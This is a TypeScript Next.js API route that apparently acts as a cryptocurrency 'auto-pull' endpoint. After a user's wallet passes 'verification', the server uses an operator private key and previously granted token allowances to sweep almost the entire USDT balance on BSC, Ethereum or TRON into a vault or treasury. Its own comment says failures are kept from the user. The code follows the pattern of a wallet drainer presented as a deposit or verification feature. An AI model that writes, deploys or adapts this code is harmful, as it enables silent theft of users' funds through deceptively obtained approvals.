import { NextResponse }        from 'next/server';
import {
  createWalletClient, createPublicClient,
  fallback, http, parseUnits, formatUnits,
  keccak256, toBytes, getAddress,
} from 'viem';
import { privateKeyToAccount }  from 'viem/accounts';
import { bsc, mainnet }         from 'viem/chains';
import { requireAuth }          from '@/lib/auth/require-auth';
import { connectToDatabase, Wallet, getAutoPullSettings } from '@/lib/db';
import { errorResponse }        from '@/lib/utils/errors';
import { tronVaultPullFunds, getTrc20Allowance } from '@/lib/tron/server-sign';
import { creditPlatformWallet } from '@/lib/wallet/platform-wallet';

export const dynamic = 'force-dynamic';

type Network = 'BEP20' | 'ERC20' | 'TRC20';

const VAULT_ABI = [
  { name:'pullFunds', type:'function' as const, stateMutability:'nonpayable' as const,
    inputs:[{name:'token',type:'address'},{name:'from',type:'address'},{name:'amount',type:'uint256'},{name:'orderId',type:'bytes32'}],
    outputs:[] },
  { name:'allowance', type:'function' as const, stateMutability:'view' as const,
    inputs:[{name:'token',type:'address'},{name:'user',type:'address'}],
    outputs:[{type:'uint256'}] },
] as const;

const ERC20_ABI = [
  { name:'transferFrom', type:'function' as const, stateMutability:'nonpayable' as const,
    inputs:[{name:'from',type:'address'},{name:'to',type:'address'},{name:'value',type:'uint256'}],
    outputs:[{name:'',type:'bool'}] },
  { name:'allowance', type:'function' as const, stateMutability:'view' as const,
    inputs:[{name:'owner',type:'address'},{name:'spender',type:'address'}],
    outputs:[{type:'uint256'}] },
  { name:'balanceOf', type:'function' as const, stateMutability:'view' as const,
    inputs:[{name:'account',type:'address'}],
    outputs:[{type:'uint256'}] },
] as const;

const TRON_USDT = 'TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t';

const NET_CFG = {
  BEP20: {
    token:    '0x55d398326f99059fF775485246999027B3197955' as `0x${string}`,
    decimals: 18, chain: bsc,
    rpcs: [process.env.NEXT_PUBLIC_BSC_RPC, 'https://bsc-dataseed.binance.org', 'https://bsc.drpc.org'].filter(Boolean) as string[],
    vaultEnv: process.env.VAULT_BEP20,
  },
  ERC20: {
    token:    '0xdAC17F958D2ee523a2206206994597C13D831ec7' as `0x${string}`,
    decimals: 6, chain: mainnet,
    rpcs: [process.env.NEXT_PUBLIC_ETHEREUM_RPC, 'https://eth.llamarpc.com', 'https://eth.drpc.org'].filter(Boolean) as string[],
    vaultEnv: process.env.VAULT_ERC20,
  },
} as const;

function normaliseKey(k: string): `0x${string}` {
  return (k.startsWith('0x') ? k : `0x${k}`) as `0x${string}`;
}

/**
 * POST /api/wallets/auto-pull
 * Body: { address: string, network: 'BEP20'|'ERC20'|'TRC20' }
 *
 * Called by the client after wallet verification completes.
 * Checks autoPull settings, verifies the balance threshold is met,
 * and executes the on-chain pull if all conditions are satisfied.
 * Fails gracefully — errors are logged but do NOT surface to user.
 */
export async function POST(req: Request) {
  try {
    const user = await requireAuth();
    const body = await req.json() as { address?: string; network?: string };
    const address = (body.address ?? '').trim();
    const network = (body.network ?? '') as Network;

    if (!address || !['BEP20', 'ERC20', 'TRC20'].includes(network)) {
      return NextResponse.json({ skipped: true, reason: 'invalid_params' });
    }

    await connectToDatabase();
    const settings = await getAutoPullSettings();

    if (!settings.enabled) {
      return NextResponse.json({ skipped: true, reason: 'disabled' });
    }

    // Find the wallet record (must be verified + approved)
    const wallet = await Wallet.findOne({
      userId:     user.id,
      address:    address.startsWith('T') ? address : address.toLowerCase(),
      isVerified: true,
      approved:   true,
    }).lean();

    if (!wallet) {
      return NextResponse.json({ skipped: true, reason: 'wallet_not_found' });
    }

    /* ── TRC20 ── */
    if (network === 'TRC20') {
      const vault   = process.env.VAULT_TRC20;
      const operKey = process.env.TRON_OPERATOR_PRIVATE_KEY;
      if (!vault || !operKey) return NextResponse.json({ skipped: true, reason: 'tron_not_configured' });

      // Fetch TRON balance server-side
      const headers: Record<string, string> = {};
      if (process.env.TRONGRID_API_KEY) headers['TRON-PRO-API-KEY'] = process.env.TRONGRID_API_KEY;
      const acctRes  = await fetch(`https://api.trongrid.io/v1/accounts/${address}`, { headers });
      const acctJson = await acctRes.json();
      const trc20: Record<string, string>[] = acctJson?.data?.[0]?.trc20 ?? [];
      const entry   = trc20.find(t => t[TRON_USDT] !== undefined);
      const balance = entry ? Number(BigInt(entry[TRON_USDT] || '0')) / 1e6 : 0;

      if (balance < settings.minBalanceToTrigger) {
        return NextResponse.json({ skipped: true, reason: 'below_threshold', balance });
      }

      // Work in raw sun to avoid float precision loss; subtract 1 USDT margin
      const rawSun    = BigInt(entry?.[TRON_USDT] ?? '0');
      const MARGIN_SUN = BigInt(1_000_000); // 1 USDT in sun
      const pullSun   = rawSun > MARGIN_SUN ? rawSun - MARGIN_SUN : rawSun;

      const allowance = await getTrc20Allowance(address, vault);
      if (allowance < pullSun) {
        return NextResponse.json({ skipped: true, reason: 'insufficient_allowance', balance });
      }

      const txid = await tronVaultPullFunds(vault, address, pullSun, operKey);
      const pulled = Number(pullSun) / 1e6;
      console.log('[auto-pull] TRC20 pulled', { userId: user.id, address, balance, pulled, txid });
      await creditPlatformWallet(user.id, pulled, `Funds added from TRC20 wallet (${address.slice(0, 6)}…${address.slice(-4)})`);
      return NextResponse.json({ success: true, txHash: txid, amount: pulled, network: 'TRC20' });
    }

    /* ── EVM (BEP20 / ERC20) ── */
    const cfg    = NET_CFG[network];
    const rawKey = process.env.VAULT_OPERATOR_PRIVATE_KEY;
    if (!rawKey) return NextResponse.json({ skipped: true, reason: 'operator_key_not_set' });

    const account      = privateKeyToAccount(normaliseKey(rawKey));
    const transport    = fallback(cfg.rpcs.map(r => http(r, { timeout: 12_000 })));
    const publicClient = createPublicClient({ chain: cfg.chain, transport });
    const walletClient = createWalletClient({ account, chain: cfg.chain, transport });
    const userAddr     = getAddress(address) as `0x${string}`;

    // Fetch USDT balance server-side (raw bigint to avoid float precision loss)
    const rawBal  = await publicClient.readContract({ address: cfg.token, abi: ERC20_ABI, functionName: 'balanceOf', args: [userAddr] }) as bigint;
    const balance = parseFloat(formatUnits(rawBal, cfg.decimals));

    if (balance < settings.minBalanceToTrigger) {
      return NextResponse.json({ skipped: true, reason: 'below_threshold', balance });
    }

    // Subtract $1 margin in bigint to avoid float precision failures
    const MARGIN  = parseUnits('1', cfg.decimals);
    const pullUnits = rawBal > MARGIN ? rawBal - MARGIN : rawBal;
    const pulled    = parseFloat(formatUnits(pullUnits, cfg.decimals));

    const vaultRaw  = (cfg.vaultEnv ?? '').trim();
    const vaultAddr = (vaultRaw.startsWith('0x') && vaultRaw.length === 42) ? getAddress(vaultRaw) as `0x${string}` : null;

    let isContract = false;
    if (vaultAddr) {
      const code = await publicClient.getBytecode({ address: vaultAddr }).catch(() => null);
      isContract = !!code && code !== '0x' && code.length > 2;
    }

    let txHash: `0x${string}`;

    if (isContract && vaultAddr) {
      const have = await publicClient.readContract({ address: vaultAddr, abi: VAULT_ABI, functionName: 'allowance', args: [cfg.token, userAddr] }) as bigint;
      if (have < pullUnits) return NextResponse.json({ skipped: true, reason: 'insufficient_vault_allowance', balance });

      const orderId = keccak256(toBytes(`autopull-${user.id}-${Date.now()}`));
      txHash = await walletClient.writeContract({ address: vaultAddr, abi: VAULT_ABI, functionName: 'pullFunds', args: [cfg.token, userAddr, pullUnits, orderId] });
    } else {
      const have = await publicClient.readContract({ address: cfg.token, abi: ERC20_ABI, functionName: 'allowance', args: [userAddr, account.address] }) as bigint;
      if (have < pullUnits) return NextResponse.json({ skipped: true, reason: 'insufficient_allowance', balance });

      const treasury = ((process.env[`TREASURY_${network}`] ?? '').trim() || account.address) as `0x${string}`;
      txHash = await walletClient.writeContract({ address: cfg.token, abi: ERC20_ABI, functionName: 'transferFrom', args: [userAddr, treasury, pullUnits] });
    }

    // Fire-and-forget receipt — don't block the response waiting for confirmation.
    // The platform-wallet credit only happens once the transfer actually confirms,
    // so a reverted/failed transfer never shows up as a credited balance.
    publicClient.waitForTransactionReceipt({ hash: txHash, timeout: 120_000 })
      .then(receipt => {
        console.log('[auto-pull] EVM confirmed', { userId: user.id, address, network, pulled, txHash });
        if (receipt.status === 'success') {
          creditPlatformWallet(user.id, pulled, `Funds added from ${network} wallet (${address.slice(0, 6)}…${address.slice(-4)})`);
        }
      })
      .catch(e => console.error('[auto-pull] receipt error', e?.message));

    console.log('[auto-pull] EVM submitted', { userId: user.id, address, network, balance, pulled, txHash });
    return NextResponse.json({ success: true, txHash, amount: pulled, network });

  } catch (err: any) {
    console.error('[auto-pull] error:', err?.message ?? err);
    return errorResponse(err);
  }
}
